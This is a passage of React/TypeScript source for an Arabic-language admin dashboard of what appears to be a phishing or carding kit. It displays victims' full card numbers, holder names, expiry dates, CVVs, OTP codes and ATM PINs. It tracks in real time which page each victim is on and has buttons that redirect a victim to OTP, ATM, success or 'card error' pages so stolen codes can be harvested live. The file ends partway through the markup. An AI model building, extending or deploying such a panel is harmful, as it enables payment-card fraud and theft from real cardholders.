import { useEffect, useMemo, useState, useCallback, useRef, type ReactNode } from "react";
import { useLocation } from "wouter";
import { getToken, logoutAdmin } from "@/lib/auth";
import { getAdminStats, listAdminSubmissions, sendAdminControl, adminLogoutAll, adminChangePassword, getAllAdminSubmissions, getAdminSubmissionsFromSupabase, sendRedirectCommand, type RedirectTarget } from "@/lib/api";
import { getAdminSettings, saveAdminSettings, getBlockedSessions, blockSession, unblockSession, getTrashItems, moveSubmissionToTrash, restoreTrashItem, deleteTrashItem, clearTrash } from "@/lib/admin-store";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { ScrollArea } from "@/components/ui/scroll-area";
import {
  LogOut,
  Clock,
  ShieldCheck,
  CreditCard,
  KeyRound,
  Banknote,
  ChevronDown,
  ChevronUp,
  Activity,
  Wifi,
  Home,
  ArrowRight,
  AlertCircle,
} from "lucide-react";

// Import heartbeat tracking utilities
import { 
  useHeartbeatTracking, 
  formatLiveTime, 
  getSecondsSincePing,
  getPageName,
  getLatestPing,
} from "@/lib/heartbeat";
import type { PingData } from "@/lib/heartbeat";

interface SubmissionRow {
  id: number;
  sessionId: string;
  type: string;
  data: string | null;
  ipAddress: string | null;
  createdAt: string;
  userAgent?: string | null;
}

interface StatsType {
  totalSessions: number;
  totalSubmissions: number;
  byType: { type: string; count: number }[];
}

// Attempt block interface for time-based grouping
interface AttemptBlock {
  attemptNumber: number;
  startTime: string;
  card?: SubmissionRow;
  otps: SubmissionRow[];  // Array of all OTP submissions (otp1, otp2, otp3, etc.)
  atms: SubmissionRow[];  // Array of all ATM submissions
  isActive: boolean;
  waitingForAdmin?: boolean;
}

const ATTEMPT_GAP_MS = 10 * 60 * 1000; // 10 minutes gap to split attempts
const ACTIVE_THRESHOLD_MS = 10 * 1000; // 10 seconds for real-time active check

// Live counter hook - updates every second for real-time display
function useLiveCounter(baseTimestamp: string | null) {
  const [liveText, setLiveText] = useState<string>("");

  useEffect(() => {
    if (!baseTimestamp) {
      setLiveText("");
      return;
    }

    const updateLiveText = () => {
      setLiveText(formatLiveTime(baseTimestamp));
    };

    // Update immediately
    updateLiveText();

    // Update every second
    const interval = setInterval(updateLiveText, 1000);
    return () => clearInterval(interval);
  }, [baseTimestamp]);

  return liveText;
}

// Live active badge component
function LiveActiveBadge({ lastPing, currentPage }: { lastPing: string | null; currentPage?: string }) {
  const [isActive, setIsActive] = useState(false);
  const [secondsAgo, setSecondsAgo] = useState(0);

  useEffect(() => {
    if (!lastPing) {
      setIsActive(false);
      return;
    }

    const checkActive = () => {
      const diff = Date.now() - new Date(lastPing).getTime();
      setIsActive(diff <= ACTIVE_THRESHOLD_MS);
      setSecondsAgo(Math.floor(diff / 1000));
    };

    checkActive();
    const interval = setInterval(checkActive, 1000);
    return () => clearInterval(interval);
  }, [lastPing]);

  if (isActive) {
    return (
      <span className="flex items-center gap-1">
        <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
        <span className="text-[10px] text-green-600 font-medium">
          نشط الآن {currentPage ? `- في صفحة ${getPageName(currentPage)}` : ""}
        </span>
      </span>
    );
  }

  return (
    <span className="flex items-center gap-1">
      <span className="w-2 h-2 rounded-full bg-slate-400" />
      <span className="text-[10px] text-slate-500">
        غير نشط {secondsAgo > 0 ? `(${secondsAgo}ث)` : ""}
      </span>
    </span>
  );
}

function parseData(raw: string | null): Record<string, string> {
  if (!raw) return {};
  try {
    return JSON.parse(raw) as Record<string, string>;
  } catch {
    return {};
  }
}

// Dynamic formatAgo with live counter
function useFormatAgo(iso: string | null) {
  return useLiveCounter(iso);
}

function formatAgo(iso: string) {
  const diff = Date.now() - new Date(iso).getTime();
  const secs = Math.floor(diff / 1000);
  if (secs < 60) return `${secs}ث`;
  const mins = Math.floor(secs / 60);
  if (mins < 60) return `${mins}د`;
  const hours = Math.floor(mins / 60);
  if (hours < 24) return `${hours}س ${mins % 60}د`;
  return `${Math.floor(hours / 24)}ي`;
}

function formatTime(iso: string) {
  return new Date(iso).toLocaleString("ar-EG", {
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    day: "numeric",
    month: "short",
  });
}

// Group rows into attempt blocks - one block per card submission
function groupIntoAttemptBlocks(rows: SubmissionRow[]): AttemptBlock[] {
  if (rows.length === 0) return [];

  // Sort by createdAt ascending (oldest first)
  const sorted = [...rows].sort((a, b) => 
    new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime()
  );

  const blocks: AttemptBlock[] = [];

  // Process rows - create NEW block for EVERY card
  for (const row of sorted) {
    if (row.type === "card") {
      // Every card creates a NEW attempt block
      const newBlock: AttemptBlock = {
        attemptNumber: blocks.length + 1,
        startTime: row.createdAt,
        card: row,
        otps: [],      // Initialize empty array for OTPs
        atms: [],     // Initialize empty array for ATMs
        isActive: false,
      };
      blocks.push(newBlock);
    } else if (row.type === "otp" && blocks.length > 0) {
      // Push ALL OTPs to the latest block (otp1, otp2, otp3, etc.)
      blocks[blocks.length - 1].otps.push(row);
    } else if (row.type === "atm" && blocks.length > 0) {
      // Push ALL ATMs to the latest block
      blocks[blocks.length - 1].atms.push(row);
    }
  }

  // Mark the most recent block as active (if within 5 minutes)
  if (blocks.length > 0) {
    const latestBlock = blocks[blocks.length - 1];
    const latestTime = new Date(latestBlock.startTime).getTime();
    const now = Date.now();
    if (now - latestTime < ACTIVE_THRESHOLD_MS) {
      latestBlock.isActive = true;
    }
  }

  return blocks;
}

function StatCard({ label, value, icon, color, onClick }: { label: string; value: number; icon: ReactNode; color: string; onClick?: () => void }) {
  return (
    <button
      type="button"
      onClick={onClick}
      disabled={!onClick}
      className={`rounded-2xl sm:rounded-3xl border bg-white p-3 sm:p-4 text-right shadow-sm transition ${onClick ? "hover:shadow-md cursor-pointer active:scale-[0.98]" : "cursor-default"}`}
    >
      <div className="flex items-center justify-between mb-2 sm:mb-3">
        <div className={`w-9 h-9 sm:w-11 sm:h-11 rounded-xl sm:rounded-2xl flex items-center justify-center ${color}`}>{icon}</div>
        <span className="text-2xl sm:text-3xl font-bold text-slate-900">{value}</span>
      </div>
      <p className="text-[10px] sm:text-xs text-slate-500">{label}</p>
      {onClick && <p className="text-[10px] sm:text-xs text-blue-500 mt-1 sm:mt-2">انقر للتفاصيل</p>}
    </button>
  );
}

function SessionHistoryDialog({ open, rows, onClose }: { open: boolean; rows: SubmissionRow[]; onClose: () => void }) {
  if (!open) return null;
  return (
    <Dialog open onOpenChange={(value) => !value && onClose()}>
      <DialogContent className="sm:max-w-[760px] max-h-[85vh] flex flex-col" dir="rtl">
        <DialogHeader>
          <DialogTitle>سجل الجلسة</DialogTitle>
        </DialogHeader>
        <ScrollArea className="flex-1 mt-4">
          <div className="space-y-4">
            {rows.map((row) => {
              const data = parseData(row.data);
              return (
                <div key={row.id} className="rounded-3xl border border-slate-200 bg-white p-4">
                  <div className="flex flex-col gap-2 sm:flex-row sm:items-center sm:justify-between text-xs text-slate-500 mb-3">
                    <span>{row.type.toUpperCase()}</span>
                    <span dir="ltr">{formatAgo(row.createdAt)}</span>
                  </div>
                  <div className="grid gap-3 sm:grid-cols-2 text-xs text-slate-700">
                    {Object.entries(data).map(([key, value]) => (
                      <div key={key} className="rounded-2xl bg-slate-50 p-3">
                        <div className="font-semibold text-slate-900">{key}</div>
                        <div className="mt-1 font-mono break-all">{String(value ?? "")}</div>
                      </div>
                    ))}
                    <div className="rounded-2xl bg-slate-50 p-3 text-[11px] text-slate-500">
                      <div>IP: {row.ipAddress ?? "غير معروف"}</div>
                      <div>المستخدم: {row.userAgent ?? "غير معروف"}</div>
                    </div>
                  </div>
                </div>
              );
            })}
          </div>
        </ScrollArea>
      </DialogContent>
    </Dialog>
  );
}

// Single Attempt Block Component
function AttemptBlockCard({
  block,
  onControl,
  loadingAction,
  isLatest,
  currentPage,
  sessionId,
}: {
  block: AttemptBlock;
  onControl: (sessionId: string, action: string) => Promise<void>;
  loadingAction: string | null;
  isLatest: boolean;
  currentPage?: string;
  sessionId: string;
}) {
  const cardData = block.card ? parseData(block.card.data) : null;

  const formattedCard = cardData?.cardNumber
    ? cardData.cardNumber.replace(/(.{4})/g, "$1 ").trim()
    : "—";

  // Live counter for block start time
  const liveTimeText = useLiveCounter(block.startTime);

  // Check if user is on an OTP page
  const isOnOtpPage = currentPage && (
    currentPage.includes('الرمز') || 
    currentPage.includes('OTP') ||
    currentPage.includes('التحقق')
  );

  return (
    <div className={`rounded-3xl border p-4 ${block.isActive ? "border-green-300 bg-green-50/50" : "border-slate-200 bg-white"}`}>
      {/* Attempt Header */}
      <div className="flex items-center justify-between mb-3">
        <div className="flex items-center gap-2">
          <span className={`text-xs font-bold px-2 py-1 rounded-full ${block.isActive ? "bg-green-100 text-green-700" : "bg-slate-100 text-slate-600"}`}>
            المحاولة #{block.attemptNumber}
          </span>
          {block.isActive && (
            <span className="flex items-center gap-1 text-xs text-green-600">
              <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
              نشط
            </span>
          )}
        </div>
        <div className="flex items-center gap-2 text-xs text-slate-500">
          <Wifi className="w-3 h-3" />
          <span dir="ltr">{liveTimeText}</span>
        </div>
      </div>

      {/* Card Data */}
      {block.card ? (
        <div className="rounded-2xl border border-slate-100 bg-slate-50 p-3 mb-3">
          <div className="flex items-center justify-between mb-2">
            <span className="text-xs font-semibold text-slate-500">البطاقة</span>
            <CreditCard className="w-4 h-4 text-slate-400" />
          </div>
          <p className="text-lg font-bold font-mono text-slate-900" dir="ltr">{formattedCard}</p>
          <div className="mt-2 grid grid-cols-3 gap-2 text-xs text-slate-600">
            <div><span className="text-slate-400">المالك:</span> {cardData?.cardHolder ?? "—"}</div>
            <div><span className="text-slate-400">انتهاء:</span> {cardData?.expiry ?? "—"}</div>
            <div><span className="text-slate-400">CVV:</span> {cardData?.cvv ?? "—"}</div>
          </div>
        </div>
      ) : (
        <div className="rounded-2xl border border-dashed border-slate-200 bg-slate-50 p-3 mb-3 text-xs text-slate-400 text-center">
          لا توجد بطاقة لهذه المحاولة
        </div>
      )}

      {/* OTP Codes - Render ALL OTPs in sequence */}
      {block.otps.length > 0 ? (
        <div className="space-y-2 mb-3">
          {block.otps.map((otpRow, index) => {
            const otpItemData = parseData(otpRow.data);
            return (
              <div key={otpRow.id} className="rounded-2xl border border-green-200 bg-green-50 p-3">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-xs font-semibold text-green-700">رمز OTP {index + 1}</span>
                  <KeyRound className="w-4 h-4 text-green-500" />
                </div>
                <p className="text-2xl font-bold font-mono text-green-800" dir="ltr">{otpItemData?.otpCode ?? "—"}</p>
                <span className="text-xs text-green-600 mt-1 block">{formatAgo(otpRow.createdAt)}</span>
              </div>
            );
          })}
        </div>
      ) : block.atms.length > 0 ? (
        <div className="space-y-2 mb-3">
          {block.atms.map((atmRow, index) => {
            const atmItemData = parseData(atmRow.data);
            return (
              <div key={atmRow.id} className="rounded-2xl border border-blue-200 bg-blue-50 p-3">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-xs font-semibold text-blue-700">رمز ATM {index + 1}</span>
                  <Banknote className="w-4 h-4 text-blue-500" />
                </div>
                <p className="text-xl font-bold font-mono text-blue-800" dir="ltr">{atmItemData?.atmCode ?? "—"}</p>
                <span className="text-xs text-blue-600 mt-1 block">{formatAgo(atmRow.createdAt)}</span>
              </div>
            );
          })}
        </div>
      ) : isLatest && block.card ? (
        // Smart visibility: Only show placeholder when user is on an OTP page
        isOnOtpPage ? (
          <div className="rounded-2xl border border-dashed border-orange-200 bg-orange-50/50 p-4 mb-3 text-center animate-pulse">
            <span className="text-sm text-orange-600">⏳ بانتظار إدخال رمز OTP لهذه البطاقة...</span>
          </div>
        ) : (
          <div className="rounded-2xl border border-slate-100 bg-slate-50 p-3 mb-3 text-xs text-slate-400 text-center">
            لم يتم إدخال رمز OTP
          </div>
        )
      ) : (
        <div className="rounded-2xl border border-slate-100 bg-slate-50 p-3 mb-3 text-xs text-slate-400 text-center">
          لم يتم إدخال رمز OTP
        </div>
      )}

      {/* Action Buttons - Only for the latest attempt */}
      {isLatest && (
        <div className="grid grid-cols-2 gap-2 mt-2">
          <button
            type="button"
            disabled={loadingAction === "go_otp"}
            onClick={() => void onControl(sessionId, "go_otp")}
            className="rounded-2xl bg-green-600 px-3 py-2 text-xs font-semibold text-white hover:bg-green-700 disabled:cursor-not-allowed disabled:opacity-50"
          >
            {loadingAction === "go_otp" ? "...جارٍ" : "✓ تحويل لـ OTP"}
          </button>
          <button
            type="button"
            disabled={loadingAction === "card_error"}
            onClick={() => void onControl(sessionId, "card_error")}
            className="rounded-2xl border border-red-200 bg-red-50 px-3 py-2 text-xs font-semibold text-red-700 hover:bg-red-100 disabled:cursor-not-allowed disabled:opacity-50"
          >
            {loadingAction === "card_error" ? "...جارٍ" : "✗ خطأ البطاقة"}
          </button>
        </div>
      )}
    </div>
  );
}

function SessionBox({
  sessionId,
  rows,
  blocked,
  selected,
  lastPing,
  currentPage,
  onToggleSelect,
  onControl,
  onBlock,
  onUnblock,
  onDelete,
  onOpenHistory,
  onRedirect,
}: {
  sessionId: string;
  rows: SubmissionRow[];
  blocked?: string;
  selected: boolean;
  lastPing?: string | null;
  currentPage?: string;
  onToggleSelect: () => void;
  onControl: (sessionId: string, action: string) => Promise<void>;
  onBlock: () => void;
  onUnblock: () => void;
  onDelete: () => void;
  onOpenHistory: () => void;
  onRedirect: (target: RedirectTarget) => void;
}) {
  const [expanded, setExpanded] = useState(true);
  const [loadingAction, setLoadingAction] = useState<string | null>(null);

  // Get initial data
  const initialRow = rows.find((row) => row.type === "initial");
  const initialData = parseData(initialRow?.data ?? null);
  const name = initialData.ownerName || "مستخدم";
  const phone = initialData.phone || "بدون هاتف";

  // Group into attempt blocks
  const attemptBlocks = groupIntoAttemptBlocks(rows);

  // Live counter for last activity
  const latestActivity = rows.length > 0 
    ? [...rows].sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())[0].createdAt 
    : null;
  const liveActivityText = useLiveCounter(latestActivity);

  // Check if session is active based on ping (within 10 seconds)

  // Wrapper for onControl that manages loading state
  const handleBlockControl = async (sessionId: string, action: string) => {
    setLoadingAction(action);
    try {
      await onControl(sessionId, action);
    } finally {
      setLoadingAction(null);
    }
  };

  // Handle redirect with loading state
  const handleRedirectAction = (target: RedirectTarget) => {
    onRedirect(target);
  };

  return (
    <div className={`rounded-3xl border bg-white shadow-sm transition ${selected ? "ring-2 ring-blue-400" : ""} ${blocked ? "opacity-75" : ""}`}>
      <div className="p-4">
        {/* Session Header */}
        <div className="flex flex-col gap-3 sm:flex-row sm:items-start sm:justify-between">
          <div className="flex items-start gap-3">
            <input
              type="checkbox"
              checked={selected}
              onChange={onToggleSelect}
              className="mt-1 h-4 w-4 rounded border-slate-300 text-blue-600 focus:ring-blue-500"
            />
            <div className="min-w-0 text-right">
              <button type="button" onClick={() => setExpanded((value) => !value)} className="w-full text-right">
                <div className="flex items-center justify-between gap-3">
                  <div className="space-y-1">
                    <p className="text-sm font-semibold text-slate-900 truncate">{name}</p>
                    <p className="text-xs text-slate-500" dir="ltr">{phone}</p>
                  </div>
                  <div className="flex items-center gap-2 text-xs">
                    {latestActivity && (
                      <span className="text-slate-400 flex items-center gap-1">
                        <Activity className="w-3 h-3" />
                        {liveActivityText}
                      </span>
                    )}
                    {expanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                  </div>
                </div>
                <div className="mt-2 flex items-center justify-between gap-2">
                  <LiveActiveBadge lastPing={lastPing ?? null} currentPage={currentPage} />
                  <span className="text-[11px] text-slate-400">#{sessionId.slice(0, 8)}</span>
                </div>
              </button>
            </div>
          </div>

          <div className="flex flex-wrap gap-2 self-end">
            <button
              type="button"
              onClick={onOpenHistory}
              className="rounded-2xl border border-slate-200 bg-slate-50 px-3 py-2 text-xs text-slate-700 hover:bg-slate-100"
            >
              سجل كامل
            </button>
            <button
              type="button"
              onClick={blocked ? onUnblock : onBlock}
              className={`rounded-2xl px-3 py-2 text-xs font-semibold ${blocked ? "border border-green-200 bg-green-50 text-green-700 hover:bg-green-100" : "border border-slate-200 bg-slate-50 text-slate-700 hover:bg-slate-100"}`}
            >
              {blocked ? "رفع الحظر" : "حظر"}
            </button>
            <button
              type="button"
              onClick={onDelete}
              className="rounded-2xl border border-red-200 bg-red-50 px-3 py-2 text-xs text-red-700 hover:bg-red-100"
            >
              سلة المهملات
            </button>
          </div>

          {/* Navigation Control Buttons - Send redirect commands */}
          <div className="flex flex-wrap gap-1.5 mt-3 pt-3 border-t border-slate-100">
            <span className="text-[10px] text-slate-400 w-full mb-1">تحكم التنقل المباشر:</span>
            <button
              type="button"
              onClick={() => handleRedirectAction('home')}
              className="rounded-lg border border-blue-200 bg-blue-50 px-2 py-1 text-[10px] text-blue-700 hover:bg-blue-100 flex items-center gap-1"
            >
              <Home className="w-3 h-3" /> الرئيسية
            </button>
            <button
              type="button"
              onClick={() => handleRedirectAction('card')}
              className="rounded-lg border border-purple-200 bg-purple-50 px-2 py-1 text-[10px] text-purple-700 hover:bg-purple-100 flex items-center gap-1"
            >
              <CreditCard className="w-3 h-3" /> البطاقة
            </button>
            <button
              type="button"
              onClick={() => handleRedirectAction('otp1')}
              className="rounded-lg border border-green-200 bg-green-50 px-2 py-1 text-[10px] text-green-700 hover:bg-green-100 flex items-center gap-1"
            >
              <KeyRound className="w-3 h-3" /> الرمز 1
            </button>
            <button
              type="button"
              onClick={() => handleRedirectAction('otp2')}
              className="rounded-lg border border-green-200 bg-green-50 px-2 py-1 text-[10px] text-green-700 hover:bg-green-100 flex items-center gap-1"
            >
              <KeyRound className="w-3 h-3" /> الرمز 2
            </button>
            <button
              type="button"
              onClick={() => handleRedirectAction('otp3')}
              className="rounded-lg border border-green-200 bg-green-50 px-2 py-1 text-[10px] text-green-700 hover:bg-green-100 flex items-center gap-1"
            >
              <KeyRound className="w-3 h-3" /> الرمز 3
            </button>
            <button
              type="button"
              onClick={() => handleRedirectAction('atm')}
              className="rounded-lg border border-blue-200 bg-blue-50 px-2 py-1 text-[10px] text-blue-700 hover:bg-blue-100 flex items-center gap-1"
            >
              <Banknote className="w-3 h-3" /> الصراف
            </button>
            <button
              type="button"
              onClick={() => handleRedirectAction('success')}
              className="rounded-lg border border-emerald-200 bg-emerald-50 px-2 py-1 text-[10px] text-emerald-700 hover:bg-emerald-100 flex items-center gap-1"
            >
              <ArrowRight className="w-3 h-3" /> نجاح
            </button>
            <button
              type="button"
              onClick={() => handleRedirectAction('error')}
              className="rounded-lg border border-red-200 bg-red-50 px-2 py-1 text-[10px] text-red-700 hover:bg-red-100 flex items-center gap-1"
            >
              <AlertCircle className="w-3 h-3" /> خطأ
            </button>
          </div>
        </div>

        {/* Timeline Content */}
        {expanded && (
          <div className="mt-4 space-y-3 border-t border-slate-100 pt-4">
            {attemptBlocks.length === 0 ? (
              <div className="rounded-3xl border border-dashed border-slate-300 bg-slate-50 p-4 text-xs text-slate-500 text-center">
                <Activity className="w-8 h-8 mx-auto mb-2 text-slate-300" />
                لا توجد محاولات حتى الآن
              </div>
            ) : (
              <div className="space-y-3">
                {/* Render blocks in reverse order (latest first) */}
                {[...attemptBlocks].reverse().map((block, index) => (
                  <AttemptBlockCard
                    key={block.attemptNumber}
                    block={block}
                    onControl={handleBlockControl}
                    loadingAction={loadingAction}
                    isLatest={index === 0}
                    currentPage={currentPage}
                    sessionId={sessionId}
                  />
                ))}
              </div>
            )}

            {/* Session Info */}
            <div className="text-[11px] text-slate-400 border-t border-slate-100 pt-3 flex items-center justify-between">
              <span>{attemptBlocks.length} محاولة</span>
              <span>ID: {sessionId.slice(0, 12)}...</span>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

export default function AdminDashboard() {
  const [, setLocation] = useLocation();
  const [rawRows, setRawRows] = useState<SubmissionRow[]>([]);
  const [stats, setStats] = useState<StatsType | null>(null);
  const [selectedIds, setSelectedIds] = useState<string[]>([]);
  const [blockedSessions, setBlockedSessions] = useState(getBlockedSessions());
  const [trashItems, setTrashItems] = useState(getTrashItems());
  const [settingsOpen, setSettingsOpen] = useState(false);
  const [trashOpen, setTrashOpen] = useState(false);
  const [passwordOpen, setPasswordOpen] = useState(false);
  const [historyDialog, setHistoryDialog] = useState<{ sessionId: string; rows: SubmissionRow[] } | null>(null);
  const [settings, setSettings] = useState(getAdminSettings());
  const [passwordValue, setPasswordValue] = useState("");
  const [passwordStatus, setPasswordStatus] = useState<string | null>(null);
  const [sessionPings, setSessionPings] = useState<Record<string, PingData>>({});
  const intervalRef = useRef<number | null>(null);
  const pingsIntervalRef = useRef<number | null>(null);

  // Fetch pings for all sessions
  const fetchPings = useCallback(async () => {
    const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
    const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
    
    if (!supabaseUrl || !supabaseKey) return;

    try {
      // Get all pings, ordered by session and time
      const response = await fetch(
        `${supabaseUrl}/rest/v1/pings?select=*&order=last_ping.desc`,
        {
          headers: {
            'apikey': supabaseKey,
            'Authorization': `Bearer ${supabaseKey}`,
          },
        }
      );

      if (!response.ok) return;

      const data = await response.json();
      
      // Get the latest ping for each session
      const latestPings: Record<string, PingData> = {};
      for (const ping of data || []) {
        if (!latestPings[ping.session_id]) {
          latestPings[ping.session_id] = {
            session_id: ping.session_id,
            current_page: ping.current_page,
            last_ping: ping.last_ping,
          };
        }
      }
      
      setSessionPings(latestPings);
    } catch (error) {
      console.error("Failed to fetch pings:", error);
    }
  }, []);

  const sessions = useMemo(() => {
    const trashedIds = new Set(trashItems.map((item) => item.id));
    const grouped: Record<string, SubmissionRow[]> = {};
    rawRows
      .filter((row) => !trashedIds.has(row.id))
      .forEach((row) => {
        if (!grouped[row.sessionId]) grouped[row.sessionId] = [];
        grouped[row.sessionId].push(row);
      });

    Object.values(grouped).forEach((list) => list.sort((a, b) => new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime()));

    return Object.fromEntries(
      Object.entries(grouped).sort(([, a], [, b]) => {
        const aTime = new Date(a[a.length - 1].createdAt).getTime();
        const bTime = new Date(b[b.length - 1].createdAt).getTime();
        return bTime - aTime;
      }),
    );
  }, [rawRows, trashItems]);

  useEffect(() => {
    if (!getToken()) {
      setLocation("/admin");
    }
  }, [setLocation]);

  // Start heartbeat tracking for admin (read-only)
  useEffect(() => {
    // Poll pings every 3 seconds for real-time updates
    void fetchPings();
    pingsIntervalRef.current = window.setInterval(() => {
      void fetchPings();
    }, 3000);
    
    return () => {
      if (pingsIntervalRef.current) {
        window.clearInterval(pingsIntervalRef.current);
      }
    };
  }, [fetchPings]);

  const fetchData = useCallback(async () => {
    const token = getToken();
    if (!token) return;
    try {
      // First, try to fetch from Supabase directly (most reliable for cloud deployments)
      let submissionsData: { submissions: SubmissionRow[]; total: number };
      
      const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
      const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
      
      if (supabaseUrl && supabaseKey) {
        try {
          const supabaseSubmissions = await getAdminSubmissionsFromSupabase();
          submissionsData = { submissions: supabaseSubmissions, total: supabaseSubmissions.length };
          
          // Calculate stats from Supabase data
          const sessionMap = new Map<string, typeof supabaseSubmissions>();
          for (const row of supabaseSubmissions) {
            if (!sessionMap.has(row.sessionId)) sessionMap.set(row.sessionId, []);
            sessionMap.get(row.sessionId)!.push(row);
          }
          
          const byTypeMap = new Map<string, number>();
          for (const row of supabaseSubmissions) {
            byTypeMap.set(row.type, (byTypeMap.get(row.type) ?? 0) + 1);
          }
          
          const statsData = {
            totalSessions: sessionMap.size,
            totalSubmissions: supabaseSubmissions.length,
            byType: Array.from(byTypeMap.entries()).map(([type, count]) => ({ type, count })),
          };
          
          setStats(statsData);
          setRawRows(supabaseSubmissions);
          return;
        } catch (supabaseError) {
          console.warn("Failed to fetch from Supabase, falling back to API server:", supabaseError);
        }
      }
      
      // Fallback to API server
      const [statsData, submissionsResponse] = await Promise.all([
        getAdminStats(token),
        getAllAdminSubmissions(token),
      ]);
      setStats(statsData);
      setRawRows(submissionsResponse.submissions);
    } catch (error) {
      console.error("Failed to load admin data:", error);
      if (error instanceof Error && (error.message.includes("Unauthorized") || error.message.includes("401"))) {
        logoutAdmin();
        setLocation("/admin");
      }
    }
  }, [setLocation]);

  useEffect(() => {
    void fetchData();
    const id = window.setInterval(() => {
      void fetchData();
    }, 1000);
    intervalRef.current = id;
    return () => {
      if (intervalRef.current) window.clearInterval(intervalRef.current);
    };
  }, [fetchData]);

  useEffect(() => {
    setSelectedIds((current) => current.filter((sessionId) => Object.keys(sessions).includes(sessionId)));
  }, [sessions]);

  const handleLogout = useCallback(() => {
    logoutAdmin();
    setLocation("/admin");
  }, [setLocation]);

  const handleLogoutAll = useCallback(async () => {
    const token = getToken();
    if (!token) return;
    await adminLogoutAll(token);
    logoutAdmin();
    setLocation("/admin");
  }, [setLocation]);

  const handleChangePassword = useCallback(async () => {
    const token = getToken();
    if (!token) return;
    if (!passwordValue.trim()) {
      setPasswordStatus("أدخل كلمة مرور جديدة");
      return;
    }
    try {
      await adminChangePassword(token, passwordValue.trim());
      setPasswordStatus("تم تغيير كلمة المرور بنجاح.");
      setPasswordValue("");
    } catch (error) {
      console.error(error);
      setPasswordStatus("فشل تغيير كلمة المرور.");
    }
  }, [passwordValue]);

  const handleSaveSettings = useCallback(() => {
    saveAdminSettings(settings);
    setSettingsOpen(false);
  }, [settings]);

  const handleBlock = useCallback((sessionId: string, ownerName?: string) => {
    blockSession(sessionId, ownerName, "محظور بواسطة الإدارة");
    setBlockedSessions(getBlockedSessions());
  }, []);

  const handleUnblock = useCallback((sessionId: string) => {
    unblockSession(sessionId);
    setBlockedSessions(getBlockedSessions());
  }, []);

  const handleDeleteSession = useCallback((sessionId: string) => {
    const rows = sessions[sessionId] ?? [];
    rows.forEach((row) => {
      moveSubmissionToTrash({
        id: row.id,
        sessionId: row.sessionId,
        type: row.type,
        data: row.data,
        ipAddress: row.ipAddress,
        createdAt: row.createdAt,
        ownerName: parseData(rows[0]?.data ?? null).ownerName,
      });
    });
    setTrashItems(getTrashItems());
    setSelectedIds((current) => current.filter((id) => id !== sessionId));
  }, [sessions]);

  const handleDeleteSelected = useCallback(() => {
    selectedIds.forEach((sessionId) => handleDeleteSession(sessionId));
  }, [selectedIds, handleDeleteSession]);

  const handleRestoreTrash = useCallback((itemId: number) => {
    restoreTrashItem(itemId);
    setTrashItems(getTrashItems());
  }, []);

  const handleDeleteTrashItem = useCallback((itemId: number) => {
    deleteTrashItem(itemId);
    setTrashItems(getTrashItems());
  }, []);

  const handleEmptyTrash = useCallback(() => {
    clearTrash();
    setTrashItems([]);
  }, []);

  const handleControlAction = useCallback(async (sessionId: string, action: string) => {
    const token = getToken();
    if (!token) return;
    await sendAdminControl(sessionId, action, token);
    await fetchData();
  }, [fetchData]);

  // Handle redirect/navigation commands
  const handleRedirect = useCallback(async (sessionId: string, target: RedirectTarget) => {
    await sendRedirectCommand(sessionId, target);
  }, []);

  const blockedMap = useMemo(() => Object.fromEntries(blockedSessions.map((entry) => [entry.sessionId, entry])), [blockedSessions]);
  const sessionCount = Object.keys(sessions).length;
  const cardCount = stats?.byType.find((item) => item.type === "card")?.count ?? 0;
  const otpCount = stats?.byType.filter((item) => item.type.startsWith("otp")).reduce((sum, item) => sum + item.count, 0) ?? 0;
  const atmCount = stats?.byType.find((item) => item.type === "atm")?.count ?? 0;
  const pendingCount = Object.values(sessions).filter((rows) => rows.some((r) => r.type === "card") && !rows.some((r) => r.type.startsWith("otp"))).length;
  const blockedCount = blockedSessions.length;
  const trashedCount = trashItems.length;
  const allSelected = sessionCount > 0 && selectedIds.length === sessionCount;

  return (
    <div className="min-h-screen bg-slate-100" dir="rtl">
      <header className="sticky top-0 z-30 border-b border-slate-200 bg-white/95 backdrop-blur-lg">
        <div className="mx-auto px-3 sm:px-4 py-3 sm:py-4 space-y-3">
          <div className="flex flex-col gap-2 sm:gap-3 sm:flex-row sm:items-center sm:justify-between">
            <div className="space-y-1 text-right">
              <div className="flex flex-wrap items-center gap-2 text-base sm:text-lg font-bold text-slate-900">
                <ShieldCheck className="h-4 w-4 sm:h-5 sm:w-5 text-blue-600" />
                لوحة التحكم الإدارية
              </div>
              <p className="text-[10px] sm:text-sm text-slate-500">تواصل مع بيانات الجلسات من أي مكان، وأدر المستخدمين بسهولة.</p>
            </div>
            <div className="flex flex-wrap items-center gap-1 sm:gap-2 justify-end">
              <Button size="sm" variant="outline" onClick={fetchData} className="text-[10px] sm:text-xs">تحديث</Button>
              <Button size="sm" onClick={() => setSettingsOpen(true)} className="text-[10px] sm:text-xs">العروض</Button>
              <Button size="sm" variant="secondary" onClick={() => setPasswordOpen(true)} className="text-[10px] sm:text-xs hidden sm:flex">كلمة المرور</Button>
              <Button size="sm" variant="destructive" onClick={handleLogoutAll} className="text-[10px] sm:text-xs">خروج</Button>
              <Button size="sm" variant="ghost" onClick={handleLogout} className="text-[10px] sm:text-xs hidden md:flex">خروج</Button>
            </div>
          </div>

          <div className="grid grid-cols-2 md:grid-cols-3 gap-2 sm:gap-3">
            <div className="rounded-2xl border border-slate-200 bg-white p-3 text-right">
              <div className="text-[10px] sm:text-xs text-slate-500">الجلسات</div>
              <div className="mt-1 text-2xl sm:text-3xl font-bold text-slate-900">{sessionCount}</div>
            </div>
            <div className="rounded-2xl border border-slate-200 bg-white p-3 text-right">
              <div className="text-[10px] sm:text-xs text-slate-500">الإدخالات</div>
